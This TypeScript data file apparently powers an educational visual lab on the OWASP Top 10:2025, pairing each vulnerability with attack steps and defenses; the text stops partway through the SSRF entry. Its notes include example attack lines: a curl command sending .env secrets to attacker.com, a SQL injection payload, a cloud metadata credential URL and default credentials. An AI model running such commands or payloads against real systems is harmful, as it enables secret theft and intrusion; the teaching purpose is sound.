export interface LabNode {
  id: string;
  title: string;
  subtitle: string;
  tag: string;
  glow: 'cyan' | 'purple' | 'red' | 'amber' | 'emerald';
  badgeColor: string;
  detailTitle: string;
  detailDescription: string;
  technicalNotes: string[];
}

export interface VisualVulnerability {
  id: string;
  number: string;
  code: string;
  title: string;
  level: 'Intermediate' | 'Advanced';
  subtext: string;
  topTag: string;
  description: string;
  nodes: {
    actor: LabNode;
    entry: LabNode;
    failure: LabNode;
    impact: LabNode;
    defense: LabNode;
  };
  labels: {
    request: string;
    unsafe: string;
    impact: string;
    remediate: string;
  };
  nextId: string;
  nextTitle: string;
}

export const VISUAL_VULNERABILITIES: VisualVulnerability[] = [
  {
    id: 'A01',
    number: '1',
    code: 'A01',
    title: 'Broken Access Control',
    level: 'Intermediate',
    subtext: 'IDOR, roles, ownership, bypass',
    topTag: 'A01 · OWASP TOP 10:2025',
    description:
      'Users act outside of their intended permissions. Missing or flawed ownership verification allows unauthorized actors to read or modify records belonging to other users.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'User / External input',
        subtitle: 'Untrusted starting point',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Untrusted User Input',
        detailDescription:
          'Attacker modifies record parameters (such as changing userId=1042 to userId=8891) in requests, headers, or query strings to probe access boundaries.',
        technicalNotes: [
          'Manipulated request: GET /api/v1/invoices/8891',
          'Attacker holds valid session credentials as user 1042',
          'Crosses trust boundary into internal application API',
        ],
      },
      entry: {
        id: 'entry',
        title: 'API Gateway & Route',
        subtitle: 'Authenticates token only',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'API Gateway Layer',
        detailDescription:
          'The endpoint validates that the user is logged in, but completely skips contextual authorization to determine if the user actually owns the record.',
        technicalNotes: [
          'JWT authentication succeeds: status 200 OK',
          'No object-level permission check evaluated',
          'Forwards unmodified requested ID to data access tier',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Missing ownership check',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Authorization Failure',
        detailDescription:
          'The application queries the database using only the untrusted URL identifier without scoping by the authenticated session owner.',
        technicalNotes: [
          'Unscoped query: SELECT * FROM invoices WHERE id = 8891',
          'Omits condition: AND owner_id = session.userId',
          'Returns Alice’s confidential invoice to unauthorized party',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Confidential data exfiltration',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Business & Regulatory Impact',
        detailDescription:
          'Attacker automates an incremental loop to harvest all customer records, invoices, and PII, resulting in severe compliance and financial penalties.',
        technicalNotes: [
          'Mass unauthorized disclosure of proprietary customer data',
          'Violation of GDPR / HIPAA / PCI-DSS compliance mandates',
          'High risk of horizontal and vertical privilege escalation',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'Enforce scoped permissions',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Remediation & Defense',
        detailDescription:
          'Enforce strict server-side policy verification: reject by default and scope every database query by the authenticated user’s identity.',
        technicalNotes: [
          'Deny by default policy engine before query execution',
          'Database query scoped: WHERE id = ? AND owner_id = ?',
          'HTTP 403 Forbidden returned on unauthorized attempts',
        ],
      },
    },
    labels: {
      request: 'request',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'remediate',
    },
    nextId: 'A02',
    nextTitle: 'A02 Security Misconfiguration',
  },
  {
    id: 'A02',
    number: '2',
    code: 'A02',
    title: 'Security Misconfiguration',
    level: 'Intermediate',
    subtext: 'Debug, defaults, open ports',
    topTag: 'A02 · OWASP TOP 10:2025',
    description:
      'Secure software becomes vulnerable when deployed with factory defaults, unhandled debug consoles, wildcard CORS, or exposed cloud storage buckets.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'Internet Scanner',
        subtitle: 'Automated Shodan probe',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'External Reconnaissance Probe',
        detailDescription:
          'Adversaries utilize automated scanners to discover open management ports, debug screens, and default credentials across public IP ranges.',
        technicalNotes: [
          'Probes known management paths: /actuator/env, /admin',
          'Tests default credentials: admin:admin, root:root',
          'Examines response headers for version disclosure',
        ],
      },
      entry: {
        id: 'entry',
        title: 'Exposed Deployment',
        subtitle: 'Default services & ports',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'Exposed Deployment Tier',
        detailDescription:
          'Production web server ships with unhardened framework templates, directory indexing enabled, and debug endpoints accessible to the world.',
        technicalNotes: [
          'Directory listing active on /uploads/ and /backups/',
          'Unnecessary administrative services left enabled',
          'Wildcard CORS: Access-Control-Allow-Origin: *',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Verbose error & default auth',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Configuration Failure',
        detailDescription:
          'Unhandled server exceptions render interactive debug stack traces displaying database credentials and environment secrets directly to visitors.',
        technicalNotes: [
          'Stack trace leaks PostgreSQL connection string with password',
          'Default admin account allows immediate login without MFA',
          'Publicly writable cloud storage bucket allows file tampering',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Cloud & server takeover',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Infrastructure Compromise',
        detailDescription:
          'Attacker uses exposed cloud keys to download database dumps, upload web shells, and pivot into the internal corporate VPC.',
        technicalNotes: [
          'Full host and cloud tenant takeover via discovered secrets',
          'Permanent data loss or ransomware extortion vulnerability',
          'Zero software bug needed — configuration provided the keys',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'Automated hardening & CSP',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Hardened Deployment Strategy',
        detailDescription:
          'Disable default accounts, run automated CIS benchmarks, disable debug screens in production, and enforce strict Content Security Policies.',
        technicalNotes: [
          'Automated Infrastructure as Code (IaC) security linting',
          'Generic error screens with masked correlation IDs',
          'Strict security headers: CSP, HSTS, X-Content-Type-Options',
        ],
      },
    },
    labels: {
      request: 'scan',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'harden',
    },
    nextId: 'A03',
    nextTitle: 'A03 Software Supply Chain Failures',
  },
  {
    id: 'A03',
    number: '3',
    code: 'A03',
    title: 'Software Supply Chain Failures',
    level: 'Advanced',
    subtext: 'Packages, builds, CI/CD, SBOM',
    topTag: 'A03 · OWASP TOP 10:2025',
    description:
      'Your application trusts code written by many other people. A compromised package, build runner, repository, or update can compromise your application before it starts.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'User / External input',
        subtitle: 'Untrusted starting point',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Untrusted Input & Third-Party Code',
        detailDescription:
          'Requests, paths, parameters, cookies, files, packages, events, and external services can all cross a trust boundary.',
        technicalNotes: [
          'External packages pulled automatically from public registries',
          'Typosquatted or compromised package names in package.json',
          'Untrusted build scripts executing in CI/CD pipeline',
        ],
      },
      entry: {
        id: 'entry',
        title: 'External component',
        subtitle: 'Package / repository / build',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'External Component Entry',
        detailDescription:
          'Open-source libraries, build plugins, and base container images incorporated into the application during the automated build pipeline.',
        technicalNotes: [
          'npm install runs unverified postinstall lifecycle scripts',
          'Missing lockfile integrity verification allows package swapping',
          'Public package shadows internal organizational namespace',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Compromised trust chain',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Supply Chain Compromise',
        detailDescription:
          'Poisoned dependency runs arbitrary postinstall script, exfiltrating CI environment secrets and injecting a backdoor into the production bundle.',
        technicalNotes: [
          'Postinstall exfiltration: curl -d @.env https://attacker.com',
          'Trojanized code compiled directly into production artifact',
          'Build tools pass all unit tests despite malicious injection',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Malicious code in release',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Widespread Release Poisoning',
        detailDescription:
          'Every customer downloading the application receives the backdoor. Systemic compromise across the entire consumer ecosystem.',
        technicalNotes: [
          'Massive SolarWinds-style supply chain compromise',
          'Catastrophic brand loss, legal liability, and regulatory fines',
          'Exfiltrated signing keys permit arbitrary update trojans',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'Prevent, detect, verify',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Verified Supply Chain Controls',
        detailDescription:
          'Maintain a continuous Software Bill of Materials (SBOM), pin exact hashes in lockfiles, use private registries, and sign artifacts with Sigstore.',
        technicalNotes: [
          'Enforce npm ci --ignore-scripts in production builds',
          'Automated vulnerability scanning with Snyk, Trivy, and Dependabot',
          'Hermetic, isolated ephemeral build environments',
        ],
      },
    },
    labels: {
      request: 'request',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'remediate',
    },
    nextId: 'A04',
    nextTitle: 'A04 Cryptographic Failures',
  },
  {
    id: 'A04',
    number: '4',
    code: 'A04',
    title: 'Cryptographic Failures',
    level: 'Advanced',
    subtext: 'TLS, encryption, passwords, salts',
    topTag: 'A04 · OWASP TOP 10:2025',
    description:
      'Sensitive data exposed through weak or missing encryption in transit or at rest. Deprecated hashing algorithms allow fast offline password cracking.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'Victim / Client',
        subtitle: 'Cleartext transmission',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Unprotected Data Sender',
        detailDescription:
          'Client transmits sensitive tokens, passwords, or credit card numbers over unencrypted HTTP or protocols with weak cipher suites.',
        technicalNotes: [
          'Connection downgraded via SSL-stripping on public Wi-Fi',
          'Passwords submitted without transport layer encryption',
          'Cookies transmitted without Secure and HttpOnly flags',
        ],
      },
      entry: {
        id: 'entry',
        title: 'Network Sniffer & DB',
        subtitle: 'Interception & leak',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'Interception & Storage Layer',
        detailDescription:
          'Adversary captures network packets or accesses an unencrypted database backup containing passwords stored with fast hashes.',
        technicalNotes: [
          'Network packet capture reveals bearer session tokens',
          'Database dump exposes users table with MD5 / SHA-1 hashes',
          'Identical passwords share identical hash values (unsalted)',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Fast unsalted hash cracked',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Cryptographic Failure',
        detailDescription:
          'Using modern GPU rigs and precomputed rainbow tables, billions of MD5 guesses per second reveal plaintext passwords almost instantly.',
        technicalNotes: [
          'Hash: 5f4dcc3b5aa765d61d8327deb882cf99 -> "password" in 0.01s',
          'Absence of memory-hard work factor permits parallel GPU attack',
          'Shared encryption key hardcoded in source repository',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Plaintext credentials exposed',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Credential Compromise',
        detailDescription:
          'Attackers recover master credentials, compromising executive accounts and violating data privacy regulations globally.',
        technicalNotes: [
          'Full account takeover across corporate single sign-on (SSO)',
          'Heavy regulatory fines under GDPR, CCPA, and HIPAA',
          'Decrypted historical traffic exposing private customer records',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'Argon2id & TLS 1.3 with PFS',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Modern Cryptographic Standards',
        detailDescription:
          'Mandate TLS 1.3 with HSTS, encrypt data at rest with AES-256-GCM, and hash passwords using slow, memory-hard Argon2id with unique cryptographic salts.',
        technicalNotes: [
          'Argon2id with high memory factor and unique 128-bit salt',
          'HSTS preload header prevents protocol downgrade attacks',
          'Master encryption keys managed in Hardware Security Module (HSM)',
        ],
      },
    },
    labels: {
      request: 'sniff',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'encrypt',
    },
    nextId: 'A05',
    nextTitle: 'A05 Injection',
  },
  {
    id: 'A05',
    number: '5',
    code: 'A05',
    title: 'Injection',
    level: 'Advanced',
    subtext: 'SQL, XSS, command, parameters',
    topTag: 'A05 · OWASP TOP 10:2025',
    description:
      'Untrusted user input is directly concatenated into a dynamic interpreter (SQL, OS shell, LDAP). The interpreter executes the input as syntax rather than data.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'Attacker Input',
        subtitle: "admin' OR 1=1 --",
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Malicious Query String',
        detailDescription:
          'Attacker inputs SQL control characters designed to break out of literal quotes and alter the structure of the backend query.',
        technicalNotes: [
          "Input: ' OR '1'='1' --",
          'Single quote escapes parameter literal boundary',
          'Double dash comments out legitimate password evaluation',
        ],
      },
      entry: {
        id: 'entry',
        title: 'Vulnerable Backend',
        subtitle: 'String concatenation (+)',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'Concatenation Route',
        detailDescription:
          'Backend constructs SQL statement by gluing user input strings together with raw operators rather than binding parameters.',
        technicalNotes: [
          'Unsafe code: query = "SELECT * FROM users WHERE user = \'" + user + "\'"',
          'Client input directly controls query syntax tree',
          'Passed verbatim to database query engine',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Interpreter executes syntax',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Syntax Hijack in Interpreter',
        detailDescription:
          'Database parser treats injected text as SQL grammar, evaluating the condition 1=1 as always true and bypassing authentication completely.',
        technicalNotes: [
          'Grammar modified: WHERE (user = \'admin\' OR 1=1) ...',
          'Authentication requirement evaluated to TRUE for all rows',
          'Enables UNION SELECT data extraction and DROP TABLE payloads',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Full database exfiltration',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Database Compromise',
        detailDescription:
          'Attacker dumps all database tables, extracts password hashes and customer credit cards, or gains remote command execution on the DB server.',
        technicalNotes: [
          'Complete loss of data confidentiality and integrity',
          'Mass exfiltration of corporate trade secrets and user accounts',
          'Host operating system compromise via xp_cmdshell / COPY TO',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'Parameterized queries',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Prepared Statements & ORMs',
        detailDescription:
          'Pre-compile the SQL statement template before input arrives. Bound values are strictly treated as literal data, rendering injection impossible.',
        technicalNotes: [
          'Prepared statement: SELECT * FROM users WHERE user = ?',
          'Query structure locked before parameter arrives',
          'Single quotes treated as literal string characters only',
        ],
      },
    },
    labels: {
      request: 'inject',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'parameterize',
    },
    nextId: 'A06',
    nextTitle: 'A06 Insecure Design',
  },
  {
    id: 'A06',
    number: '6',
    code: 'A06',
    title: 'Insecure Design',
    level: 'Advanced',
    subtext: 'Threats, abuse cases, logic flaws',
    topTag: 'A06 · OWASP TOP 10:2025',
    description:
      'Flaws in software architecture and business logic present before any code was written. Even a bug-free implementation remains vulnerable if the design permits abuse.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'Botnet Client',
        subtitle: 'Automated brute-force',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Adversarial Automation',
        detailDescription:
          'Attacker analyzes workflow logic (e.g. password reset PINs, promotional coupons) and scripts automated attacks against missing controls.',
        technicalNotes: [
          'Automated script targets 4-digit SMS password reset',
          'Only 10,000 possibilities (0000–9999)',
          'Fires 200 requests per second against API',
        ],
      },
      entry: {
        id: 'entry',
        title: 'Unthrottled Endpoint',
        subtitle: 'No rate limiting in design',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'Architectural Design Oversight',
        detailDescription:
          'The architecture specification never established anti-automation controls, rate limiting, or attempt thresholds for sensitive account workflows.',
        technicalNotes: [
          'Design specification lacks threat modeling review',
          'Server processes all 10,000 attempts without lockout',
          'Client-side pricing calculation trusted by checkout backend',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'PIN matched via automation',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Business Logic Exploit',
        detailDescription:
          'Request #4,821 matches the active PIN. The system accepts the code because the design never invalidated the PIN after multiple failed attempts.',
        technicalNotes: [
          'Valid PIN matched in under 60 seconds of automated spraying',
          'No code defect exists — code followed the flawed design',
          'Negative cart quantities permit purchasing items for negative dollars',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Account takeover & revenue loss',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Logic Hijack Consequence',
        detailDescription:
          'Attacker resets executive accounts or exploits pricing calculations to order merchandise for $0.00, causing massive financial losses.',
        technicalNotes: [
          'Complete takeover of target user account without credentials',
          'Circumvention of billing and payment gateway logic',
          'Permanent loss of consumer trust in platform integrity',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'Threat modeling & rate limits',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Secure Design Patterns',
        detailDescription:
          'Perform STRIDE threat modeling during the architecture phase. Enforce 128-bit cryptographic tokens, 3-attempt lockouts, and server-side truth.',
        technicalNotes: [
          'Threat modeling conducted before coding begins',
          'Rate limiting: 3 attempts per 15 minutes + exponential backoff',
          'Token invalidation immediately upon first failed threshold',
        ],
      },
    },
    labels: {
      request: 'abuse',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'model threats',
    },
    nextId: 'A07',
    nextTitle: 'A07 Authentication Failures',
  },
  {
    id: 'A07',
    number: '7',
    code: 'A07',
    title: 'Authentication Failures',
    level: 'Advanced',
    subtext: 'Login, reset, MFA, session hijack',
    topTag: 'A07 · OWASP TOP 10:2025',
    description:
      'Failure to confirm user identity or protect session identifiers permits credential stuffing, brute force, and session fixation attacks.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'Credential Stuffing Bot',
        subtitle: 'Dark web breach list',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Automated Credential Spray',
        detailDescription:
          'Attacker loads millions of leaked username/password combinations from historical third-party breaches to exploit password reuse.',
        technicalNotes: [
          'Combo list: 100,000 corporate credentials tested',
          'Distributed across residential proxy IP pools',
          'Targeting /api/auth/login endpoint',
        ],
      },
      entry: {
        id: 'entry',
        title: 'Login Endpoint',
        subtitle: 'Single factor, no lockout',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'Unprotected Login Route',
        detailDescription:
          'The login route lacks Multi-Factor Authentication (MFA), CAPTCHA challenges, or IP-based rate limiting, allowing unlimited attempts.',
        technicalNotes: [
          'No account lockout threshold after consecutive failures',
          'Single-factor password alone grants full access',
          'Session cookie not marked HttpOnly, Secure, or SameSite',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Reused password match',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Authentication Bypass',
        detailDescription:
          'Password matches for a valid user. Because MFA is not enforced and the session ID is not rotated, the attacker gains a valid session.',
        technicalNotes: [
          'Valid credential match grants immediate HTTP 200 session',
          'Session fixation: session ID preserved before and after login',
          'Weak reset tokens with predictable entropy guessable by bots',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Corporate account usurpation',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Account Usurpation',
        detailDescription:
          'Adversary impersonates legitimate personnel, accessing payroll systems, customer records, and initiating unauthorized wire transfers.',
        technicalNotes: [
          'Executive impersonation across corporate applications',
          'Data breach notification requirements triggered',
          'Session hijacking via stolen cookies or cross-site scripting',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'FIDO2 / TOTP MFA & rotation',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Strong Authentication Controls',
        detailDescription:
          'Enforce Multi-Factor Authentication (FIDO2 WebAuthn or TOTP), reject breached passwords (NIST SP 800-63B), and rotate session tokens on login.',
        technicalNotes: [
          'Mandatory MFA eliminates credential stuffing attacks',
          'Session ID rotated and old token destroyed on login',
          'Check passwords against HaveIBeenPwned k-anonymity API',
        ],
      },
    },
    labels: {
      request: 'spray',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'enforce MFA',
    },
    nextId: 'A08',
    nextTitle: 'A08 Integrity Failures',
  },
  {
    id: 'A08',
    number: '8',
    code: 'A08',
    title: 'Integrity Failures',
    level: 'Advanced',
    subtext: 'Unsigned code, deserialization, CDN',
    topTag: 'A08 · OWASP TOP 10:2025',
    description:
      'Code and critical data updated or deserialized without cryptographic verification. Trusting unverified plugins or objects enables Remote Code Execution (RCE).',
    nodes: {
      actor: {
        id: 'actor',
        title: 'Tampered Payload',
        subtitle: 'Compromised CDN / Mirror',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Untrusted Code Source',
        detailDescription:
          'Attacker compromises an untrusted CDN mirror or executes DNS spoofing to substitute legitimate auto-update packages with trojans.',
        technicalNotes: [
          'Trojanized update package delivered over unpinned CDN',
          'Malicious serialized Java/Python object sent via HTTP',
          'Object contains gadget chain crafted to invoke system shell',
        ],
      },
      entry: {
        id: 'entry',
        title: 'Client Auto-Updater',
        subtitle: 'Downloads binary payload',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'Updater & Hydration Layer',
        detailDescription:
          'Client application downloads and attempts to install update files or hydrate serialized objects without verifying digital signatures.',
        technicalNotes: [
          'No Ed25519 or RSA code signature verification',
          'Application passes raw binary stream to ObjectInputStream / pickle',
          'Missing cryptographic hash checksum check',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Unsafe deserialization / execution',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Integrity Failure Execution',
        detailDescription:
          'Deserializer instantiates untrusted object. Magic methods (__reduce__, readObject) execute arbitrary system commands in memory upon hydration.',
        technicalNotes: [
          'Remote Code Execution (RCE) triggered during deserialization',
          'Unsigned update installer executes with administrative rights',
          'No sandbox or signature enforcement prevents command execution',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Root shell & persistent backdoor',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Persistent Host Compromise',
        detailDescription:
          'Attacker establishes a reverse shell, installs rootkits, and commands production infrastructure without alerting operators.',
        technicalNotes: [
          'Full root shell access established on server host',
          'Persistent C2 beacon beaconing out to adversary servers',
          'Supply chain attack propagated to all downstream consumers',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'Cryptographic signatures & JSON',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Cryptographic Provenance',
        detailDescription:
          'Sign all code artifacts with Sigstore/Cosign, verify SHA-256 hashes, and replace native deserializers with pure JSON and strict schemas.',
        technicalNotes: [
          'Verify cryptographic digital signature before saving or running',
          'Use pure data formats (JSON/Protobuf) with schema validation',
          'Never use native language deserializers on untrusted data',
        ],
      },
    },
    labels: {
      request: 'deliver',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'sign & verify',
    },
    nextId: 'A09',
    nextTitle: 'A09 Logging Failures',
  },
  {
    id: 'A09',
    number: '9',
    code: 'A09',
    title: 'Logging & Monitoring Failures',
    level: 'Advanced',
    subtext: 'Evidence, detection, dwell time',
    topTag: 'A09 · OWASP TOP 10:2025',
    description:
      'Attacks and intrusions go completely unnoticed for months due to absent audit logs, suppressed errors, and missing automated alerting rules.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'Stealth Intruder',
        subtitle: '5,000 brute-force attempts',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Undetected Adversary Activity',
        detailDescription:
          'Attacker conducts probing, password spraying, privilege escalation tests, and unauthorized data queries across multiple days.',
        technicalNotes: [
          '5,000 failed authentication requests fired in 2 hours',
          'Probing sensitive endpoints: /admin, /api/v1/export',
          'Exfiltrating records during off-peak hours',
        ],
      },
      entry: {
        id: 'entry',
        title: 'Application Server',
        subtitle: 'Errors caught silently',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'Silent Error Handling',
        detailDescription:
          'Application catches exceptions silently with empty catch blocks or logs only generic errors to ephemeral local text files.',
        technicalNotes: [
          'catch (e) { /* silent ignore */ } suppresses security signals',
          'No user identity, IP address, or correlation ID recorded',
          'Logs stored locally and erased on daily server restart',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Zero audit trail or alert',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Detection Blindspot',
        detailDescription:
          'Security Operations Center (SOC) receives zero alerts because threshold rules and central telemetry were never implemented.',
        technicalNotes: [
          'No SIEM alerting rule for >10 failed logins per account',
          'Adversary moves laterally across internal microservices',
          'Audit trail cannot be reconstructed for incident response',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: '200+ days undetected dwell time',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Prolonged Dwell Time',
        detailDescription:
          'Adversaries remain undetected inside internal systems for over 200 days, exfiltrating all corporate databases before discovery.',
        technicalNotes: [
          'Global average breach dwell time exceeds 204 days',
          'Incident only uncovered when external law enforcement notifies team',
          'Severe regulatory penalties for delayed breach notification',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'Centralized SIEM & alerts',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'Structured Telemetry & Alerting',
        detailDescription:
          'Stream structured JSON security events to an append-only centralized SIEM (Splunk, Datadog) with real-time alerting on threshold anomalies.',
        technicalNotes: [
          'Structured events: timestamp, actor ID, IP, endpoint, outcome',
          'Real-time PagerDuty alerts on anomalous failure thresholds',
          'Sensitive PII and passwords redacted before logging',
        ],
      },
    },
    labels: {
      request: 'probe',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'centralize logs',
    },
    nextId: 'A10',
    nextTitle: 'A10 Server-Side Request Forgery',
  },
  {
    id: 'A10',
    number: '10',
    code: 'A10',
    title: 'Server-Side Request Forgery',
    level: 'Advanced',
    subtext: 'SSRF, metadata, internal VPC',
    topTag: 'A10 · OWASP TOP 10:2025',
    description:
      'Web server fetches a remote resource (URL, avatar, webhook) supplied by the user without validating the destination, exposing internal cloud metadata.',
    nodes: {
      actor: {
        id: 'actor',
        title: 'Crafted Target URL',
        subtitle: 'http://169.254.169.254',
        tag: 'node · actor',
        glow: 'cyan',
        badgeColor: '#00e5ff',
        detailTitle: 'Crafted SSRF Payload',
        detailDescription:
          'Attacker inputs internal cloud metadata IP address (169.254.169.254) into an avatar import or webhook URL input field.',
        technicalNotes: [
          'Target: http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          'Link-local IP address accessible only from within instance',
          'Attempts to bypass external firewall protections',
        ],
      },
      entry: {
        id: 'entry',
        title: 'Vulnerable Web Server',
        subtitle: 'Fetches arbitrary remote URL',
        tag: 'node · entry',
        glow: 'purple',
        badgeColor: '#a855f7',
        detailTitle: 'Backend Request Handler',
        detailDescription:
          'The backend receives the URL and issues an HTTP GET request from behind its own corporate firewall without destination allowlisting.',
        technicalNotes: [
          'Server executes: fetch(userProvidedUrl)',
          'Omits RFC 1918 and loopback IP blocking',
          'Network request originates from trusted VPC internal IP',
        ],
      },
      failure: {
        id: 'failure',
        title: 'Security failure',
        subtitle: 'Metadata service trusts server',
        tag: 'node · failure',
        glow: 'red',
        badgeColor: '#ff3366',
        detailTitle: 'Internal Metadata Trust Violation',
        detailDescription:
          'The internal cloud metadata service trusts the local request, responding with temporary AWS IAM secret access keys and tokens.',
        technicalNotes: [
          'Metadata response: {"AccessKeyId": "ASIA...", "SecretAccessKey": "..."}',
          'Capital One-style cloud credential exfiltration occurs',
          'Internal microservices and database ports accessible via loopback',
        ],
      },
      impact: {
        id: 'impact',
        title: 'Business impact',
        subtitle: 'Cloud account takeover',
        tag: 'node · impact',
        glow: 'amber',
        badgeColor: '#f59e0b',
        detailTitle: 'Total Cloud Infrastructure Compromise',
        detailDescription:
          'Attacker configures AWS CLI with stolen IAM credentials, synchronizing all S3 customer buckets and modifying cloud security groups.',
        technicalNotes: [
          'Full AWS / GCP / Azure tenant infrastructure control',
          'Exfiltration of millions of credit card applications',
          'Destruction of production cloud virtual machines',
        ],
      },
      defense: {
        id: 'defense',
        title: 'Secure control',
        subtitle: 'URL allowlisting & IMDSv2',
        tag: 'node · defense',
        glow: 'emerald',
        badgeColor: '#10b981',
        detailTitle: 'SSRF Mitigation Architecture',
